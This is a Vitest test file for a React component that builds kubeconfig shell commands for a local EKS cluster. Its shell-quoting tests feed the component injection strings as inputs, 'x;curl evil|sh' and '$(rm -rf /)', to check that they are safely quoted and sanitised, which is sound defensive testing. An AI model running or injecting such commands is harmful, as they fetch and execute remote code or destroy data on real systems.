// @vitest-environment jsdom
import { cleanup, render, screen } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { FlashbarProvider } from '../../../contexts/FlashbarProvider';
import { LocalStackStatusProvider } from '../../../contexts/LocalStackStatusProvider';
import { stubApiFetch } from '../../../test/fixtures';
import type { EksCluster } from '../api';
import { kubeconfigCommands, shellQuote } from './connectCommands';
import { ConnectLocally } from './ConnectLocally';

const CLUSTER: EksCluster = {
  name: 'localdeck-cluster',
  arn: 'arn:aws:eks:us-east-1:000000000000:cluster/localdeck-cluster',
  status: 'ACTIVE',
  version: '1.36',
  roleArn: 'arn:aws:iam::000000000000:role/eks-role',
  vpcConfig: {
    subnetIds: ['subnet-1'],
    securityGroupIds: [],
    endpointPublicAccess: true,
    endpointPrivateAccess: false,
    publicAccessCidrs: ['0.0.0.0/0'],
  },
  tags: [],
  raw: {},
};

describe('ConnectLocally shell quoting', () => {
  it('quotes shell metacharacters with single quotes', () => {
    expect(shellQuote('x;curl evil|sh')).toBe("'x;curl evil|sh'");
    expect(shellQuote("it's")).toBe("'it'\\''s'");
    expect(shellQuote('$(rm -rf /)')).toBe("'$(rm -rf /)'");
  });

  it('uses the sanitized file name and quotes endpoint/region', () => {
    const commands = kubeconfigCommands('x;curl evil|sh', 'http://localhost:4566', 'us-east-1');

    expect(commands).toContain("export KUBECONFIG=~/Downloads/'kubeconfig-x-curl-evil-sh.yaml'");
    expect(commands).not.toContain('x;curl evil|sh.yaml');
    expect(commands).toContain("AWS_REGION='us-east-1'");
    expect(commands).toContain("export AWS_ENDPOINT_URL='http://localhost:4566'");
  });

  it('falls back to a safe file name for unicode-only cluster names', () => {
    const commands = kubeconfigCommands('クラスター', 'http://127.0.0.1:4566', 'eu-west-1');

    expect(commands).toContain("export KUBECONFIG=~/Downloads/'kubeconfig-cluster.yaml'");
    expect(commands).toContain("export AWS_ENDPOINT_URL='http://127.0.0.1:4566'");
  });
});

describe('ConnectLocally', () => {
  afterEach(() => {
    cleanup();
    vi.unstubAllGlobals();
  });

  it('renders the live endpoint and region from the status provider', async () => {
    stubApiFetch();
    render(
      <LocalStackStatusProvider>
        <FlashbarProvider>
          <ConnectLocally cluster={CLUSTER} />
        </FlashbarProvider>
      </LocalStackStatusProvider>,
    );

    // The status provider resolves /api/config and /api/health on mount; a
    // microtask flush is enough for the stubbed fetch to propagate.
    await new Promise((resolve) => setTimeout(resolve, 50));

    const pre = document.querySelector('pre');
    expect(pre?.textContent ?? '').toContain("export AWS_ENDPOINT_URL='http://localhost:4566'");
    expect(pre?.textContent ?? '').toContain("AWS_REGION='us-east-1'");
    expect(screen.getByRole('button', { name: 'Download kubeconfig' })).toBeDefined();
  });
});
